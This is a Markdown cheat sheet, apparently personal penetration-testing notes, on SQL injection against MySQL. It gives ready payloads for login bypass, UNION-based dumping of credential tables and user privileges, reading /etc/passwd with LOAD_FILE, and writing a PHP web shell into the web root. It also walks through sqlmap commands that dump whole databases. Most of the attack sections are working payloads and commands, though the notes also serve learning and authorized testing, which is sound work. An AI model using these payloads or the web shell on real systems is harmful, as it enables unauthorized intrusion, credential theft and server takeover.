---
layout: default
title: SQL Injection
permalink: /Web/sqli/
---

# SQL Injection

Injection occurs when an application misinterprets user input as actual code rather than a string, changing the code flow and executing it. This can occur by escaping user-input bounds by injecting a special character like ('), and then writing code to be executed, like JavaScript code or SQL in SQL Injections. Unless the user input is sanitized, it is very likely to execute the injected code and run it.
SQL injection refers to attacks against relational databases such as MySQL (whereas injections against non-relational databases, such as MongoDB, are NoSQL injection).

## MySQL
The `mysql` utility is used to authenticate to and interact with a MySQL/MariaDB database.
```
mysql -u root -h $host -P $port -p
```
*Note: The -p flag should be passed empty, so we are prompted to enter the password and do not pass it directly on the command line since it could be stored in cleartext in the bash_history file.
However, if you put the password in the command, there shouldn't be any spaces between '-p' and the password.*
*Note: The default MySQL/MariaDB port is 3306.*
### View Databases
```
SHOW DATABASES;
```
### Switch to Database
```
USE database_name;
```
### View Tables
```
SHOW TABLES;
```
### View Table Structure
```
DESCRIBE table_name;
```
## Few SQL Statements
### INSERT
Add new records to a given table.
```
INSERT INTO logins VALUES(1, 'admin', 'password', '2025-07-15');
```
```
INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
```
### SELECT
Retrieve data.
```
SELECT * FROM table_name;
```
### UPDATE
update specific records.
```
UPDATE logins SET password = 'change_password' WHERE id > 1;
```
### LIMIT
In case our query returns a large number of records, we can limit the results.
```
SELECT * FROM logins LIMIT 2;
```
### WHERE
To filter or search.
```
SELECT * FROM logins WHERE id > 1;
```
### LIKE
Enables selecting records by matching a certain pattern.
Records  with usernames starting with admin:
```
SELECT * FROM logins WHERE username LIKE 'admin%';
```
### SQL Operators
```
SELECT 1 = 1 AND 'test' = 'test';
```
```
SELECT 1 = 1 OR 'test' = 'abc';
```
```
SELECT NOT 1 = 1;
```
The AND, OR and NOT operators can also be represented as &&, || and !, respectively.
```
SELECT * FROM logins WHERE username != 'john' AND id > 1;
```
## Types of SQL Injections
SQL injections typically fall under three categories: In-band SQLi (Union Based or Error Based), Inferential or Blind SQLi (Boolean Based or Time Based) and Out-of-band SQLi:
-  In In-band cases, the output of both the intended and the new query may be printed directly on the front end, and we can directly read it.
-  In Blind SQLi we utilize SQL logic to retrieve the output character by character.
-  In Out-of-band case we do not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there.

## Authentication Bypass
### SQLi Discovery
To test whether the login form is vulnerable to SQL injection, we can try to add one of the below payloads (or their URL encoded versions) after our username and see if it causes any errors or changes how the page behaves: `'`, `"`, `#`, `;`, `)`.
### OR Injection
If there is at least one TRUE condition in the entire query along with an OR operator, the entire query will evaluate to TRUE.
Potential payload at a login page:
```
admin' or '1'='1
```
So the final query would be:
```
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```
Find a comprehensive list of SQLi auth bypass payloads in [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass).
If we don't know a valid username, we can put the same payload into the password fiels.
### Using Comments
We can use two types of line comments with MySQL `--` and `#`, in addition to an in-line comment `/**/` (though this is not usually used in SQL injections). 
*Note: In SQL, using two dashes only is not enough to start a comment, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.*
*Note: If you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.*
Potential payload:
```
admin'--
```
The resulting query:
```
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```
### Union Clause
Another type of SQL injection is injecting entire SQL queries executed along with the original query.
The Union clause is used to combine results from multiple SELECT statements. This means that through a UNION injection, we will be able to SELECT and dump data from all across the DBMS, from multiple tables and databases.
```
SELECT * FROM ports UNION SELECT * FROM ships;
```
*Note: The data types of the selected columns on all positions should be the same.*
*Note: A UNION statement can only operate on SELECT statements with an equal number of columns. For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.*
Potentical payload:
```
1' UNION SELECT username, password from passwords-- '
```
The resulting query:
```
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
If the original query used SELECT on a table with four columns, our UNION injection would be:
```
UNION SELECT username, 2, 3, 4 from passwords-- '
```
The resulting query:
```
SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
```
#### Detect the Number of Columns
##### Using ORDER BY
We have to inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.
Potential payload:
```
' order by 1-- -
```
And then increase the number.
#### Using UNION
Potentical payload:
```
cn' UNION select 1,2,3-- -
```
Then:
```
cn' UNION select 1,2,3,4-- -
```
*Note: It is very common that not every column will be displayed back to the user. This is the benefit of using numbers as our junk data, as it makes it easy to track which columns are printed, so we know at which column to place our query.*
*Note: We can also use `@@version` in our SQL query in the place of a cloumn to get data from the database. In MSSQL it returns MSSQL version. Error with other DBMS. We can also try `user()` to get data about the user, etc.*

## Database Enumeration
The INFORMATION_SCHEMA database contains metadata about the databases and tables present on the server.

To reference a table present in another DB, we can use the dot ‘.’ operator. For example, to SELECT a table users present in a database named my_database, we can use:
```
SELECT * FROM my_database.users;
```
The table SCHEMATA in the INFORMATION_SCHEMA database contains information about all databases on the server.
```
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```
Potential payload:
```
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
We can find the current database with the SELECT database() query:
```
cn' UNION select 1,database(),2,3-- -
```
The TABLES table contains information about all tables throughout the database. This table contains multiple columns, but we are interested in the TABLE_SCHEMA and TABLE_NAME columns.
Potential payload:
```
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
To dump the data of a table, we first need to find the column names in the table, which can be found in the COLUMNS table in the INFORMATION_SCHEMA database.
Potentical payload:
```
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
After that to dump data in another database, you can use something like that:
```
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
Ptentical payload to check user:
```
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```
Potential payload to check user privileges:
```
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
## Load Files
If we have enough privileges to read local system files, we can use the LOAD_FILE() function which is used in MariaDB / MySQL to read data from files:
```
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
This can be potentially used to leak the application source code as well.
If the page ends up rendering a HTML code within the browser we retrieved, the source can be viewed by hitting [Ctrl + U].<br>

## Write Files
Writing files if the privileges allow:
```
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```
### Writing a Web Shell
Potential payload:
```
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
Then we can test, in our browser with `http://SERVER_IP:PORT/shell.php?0=id`.

## SQLMap

SQLMap is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws.
```
python sqlmap.py -u 'http://$domain/page.php?id=5' --batch
```
*Note: the switch '--batch' is used for skipping any required user-input, by automatically choosing using the default option.*

### Running SQLMap on HTTP Requests

One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing Copy as cURL feature from within the Network (Monitor) panel inside the browser's Developer Tools.

By pasting the clipboard content into the command line, and changing the original command `curl` to `sqlmap`, we are able to use SQLMap with the identical curl command. 

#### GET Request
Example:
```
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```
#### POST Request
As for testing POST data, the --data flag can be used, as follows:
```
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```
In such cases, POST parameters uid and name will be tested for SQLi vulnerability. If we have a clear indication that the parameter uid is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using -p uid. Otherwise, we could mark it inside the provided data with the usage of special marker * as follows:
```
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```
#### Full HTTP Request
If we need to specify a complex HTTP request with lots of different header values and an elongated POST body, we can use the `-r` flag. With this option, SQLMap is provided with the "request file," containing the whole HTTP request inside a single textual file. In a common scenario, such HTTP request can be captured from within a specialized proxy application (e.g. Burp) and written into the request file.
```
sqlmap -r req.txt
```
*Note: similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (\*), such as '/?id=\*'.*

#### Prefix/Suffix

There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.
For such runs, options --prefix and --suffix can be used as follows:
```
sqlmap -r req.txt --prefix="%'))" --suffix="-- -"
```

#### Level/Risk
By default, SQLMap combines a predefined set of most common boundaries (i.e., prefix/suffix pairs), along with the vectors having a high chance of success in case of a vulnerable target. Nevertheless, there is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.

For such demands, the options --level and --risk should be used:

- The option `--level` sets aggressiveness of tests (range: 1–5). Level 5 enables the most in-depth payloads, including more techniques and headers.
- The option `--risk` sets risk level of tests (range: 1–3). Risk 3 allows more invasive queries that could potentially alter data or slow the server.
- When you change `--level` and `--risk` in SQLMap, the tool starts using different kinds of payloads and injection points (headers, parameters, cookies, etc.). But it’s not always obvious what it’s doing behind the scenes. However we can set the verbosity level with `-v` (range: p-5).

```
sqlmap -u '<target>' --level=5 --risk=3 --prefix=')`' --no-cast --dbs --tables
```
- The `--no-cast` flag disables automatic data type casting, preventing SQLMap from altering values (useful to avoid bypass failures or logic issues).
- The `--dbs` instructs sqlmap to enumerate and list all database names upon successful injection.
- Once a current database is identified, the `--tables` option lists all tables within it.

*Note: --tables assumes sqlmap is already operating inside a known database context — either from --current-db or an explicit -D <database> flag.*
```
sudo sqlmap '<target>' --level=5 --risk=3 --prefix='`)' --no-cast -D <database> -T <table_name> --dump
```
```
sqlmap -r case5.txt --level=5 --risk=3 -v 3 -T <table_name> --no-cast --dump
```

- The `-T` falg focuses SQLMap to enumerate/dump data from the table named `<table_name>`.
- The `--dump` flag instructs SQLMap to dump all data from the selected table (`<table_name>`) after successful injection.

```
sqlmap -u <target> --union-cols=<number> --level=5 --risk=3 --batch --dbs --tables
```
- `--union-cols=<number>`	manually sets the number of columns to be used in UNION SELECT injections. Can be usefule if you can count number of columns in the page output.
- `--batch`	runs sqlmap in non-interactive mode (auto-answers all prompts).

### DB Enumeration

#### DB Data Enumeration
```
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```
- Database version banner (switch --banner)
- Current user name (switch --current-user)
- Current database name (switch --current-db)
- Checking if the current user has DBA (administrator) rights (switch --is-dba)

#### Table Enumeration

```
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```
```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```
*Note: Apart from default CSV, we can specify the output format with the option `--dump-format` to HTML or SQLite, so that we can later further investigate the DB in an SQLite environment.*

#### Table/Row Enumeration

```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```
With the `-C` option we can specify the columns.

```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```
We can specify the rows with the `--start` and `--stop` options (e.g., start from 2nd up to 3rd entry).

```
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```
We can use the option `--where` to retrieve certain rows based on a known WHERE condition.

*Note: Instead of retrieving content per single-table basis, we can retrieve all tables inside the database of interest by skipping the usage of option -T altogether (e.g. --dump -D testdb). By simply using the switch --dump without specifying a table with -T, all of the current database content will be retrieved. As for the --dump-all switch, all the content from all the databases will be retrieved. In such cases, a user is also advised to include the switch --exclude-sysdbs (e.g. --dump-all --exclude-sysdbs), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.*



